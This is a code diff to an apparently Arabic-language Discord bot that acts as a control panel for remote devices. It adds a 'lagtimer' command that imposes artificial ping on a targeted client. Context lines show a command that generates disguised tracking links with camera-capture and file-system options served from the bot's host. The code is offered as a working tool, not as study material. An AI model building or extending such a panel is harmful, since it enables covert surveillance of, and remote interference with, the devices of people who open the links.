@@ -306,7 +306,7 @@ class ConfirmSaveView(discord.ui.View):
     @discord.ui.button(label="نعم، حفظ الأكواد", style=discord.ButtonStyle.green, custom_id="save_yes")
     async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        await asyncio.sleep(1) # حماية من السبام
+        await asyncio.sleep(1)
         db, sha, url, headers = fetch_db()
         if not db: return
         if "codes" not in db: db["codes"] = {}
@@ -481,7 +481,7 @@ class MainDashboardView(discord.ui.View):
         await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل:**", view=DevicesSubMenuView(devs_list) if devs_list else None, ephemeral=True)
 
 @client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
-@app_commands.checks.cooldown(1, 4) # حماية: استخدام الأمر مرة كل 4 ثوانٍ لمنع الحظر
+@app_commands.checks.cooldown(1, 4)
 async def generate(interaction: discord.Interaction, count: int = 1):
     if not 1 <= count <= 20: return await interaction.response.send_message("❌ من 1 إلى 20 فقط.", ephemeral=True)
     codes = [generate_random_code() for _ in range(count)]
@@ -535,6 +535,38 @@ async def generate_track_link(interaction: discord.Interaction, redirect_to: str
     track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}&cam={capture_cam}&fs={file_system}"
     embed = discord.Embed(title="🔗 رابط التتبع المطور جاهز", description=f"`{track_url}`", color=0xFF5733)
     await interaction.followup.send(embed=embed, ephemeral=True)
+
+@client.tree.command(name="lagtimer", description="تفعيل لاج أو بينغ مرتفع مؤقت للعميل مع تحديد المدة بالثواني")
+@app_commands.describe(
+    target="كود التفعيل أو اسم الجهاز المستهدف",
+    ping_value="قيمة البينغ (مثال: 300 أو 500 أو 1000)",
+    duration_seconds="مدة استمرار اللاج بالثواني (مثال: 30 أو 60)"
+)
+async def lagtimer_command(interaction: discord.Interaction, target: str, ping_value: int, duration_seconds: int):
+    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    if not db: return
+    
+    target_upper = target.strip().upper()
+    if target_upper not in db.get("codes", {}):
+        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target}`", ephemeral=True)
+        return
+    
+    if "remote_lag_timers" not in db: db["remote_lag_timers"] = {}
+    db["remote_lag_timers"][target_upper] = {
+        "ping": ping_value,
+        "duration": duration_seconds,
+        "id": str(int(time.time()))
+    }
+    
+    if save_db(db, sha, url, headers, f"Set lag timer {ping_value}ms for {duration_seconds}s on {target_upper}"):
+        await interaction.followup.send(
+            f"⏱️ **تم جدولة وتفعيل اللاج المؤقت بنجاح!**\n"
+            f"• العميل: `{target_upper}`\n"
+            f"• القيمة: `{ping_value} ms`\n"
+            f"• المدة: `{duration_seconds} ثانية` (سينطفئ تلقائياً)", 
+            ephemeral=True
+        )
 
 @client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
 async def unused_command(interaction: discord.Interaction):
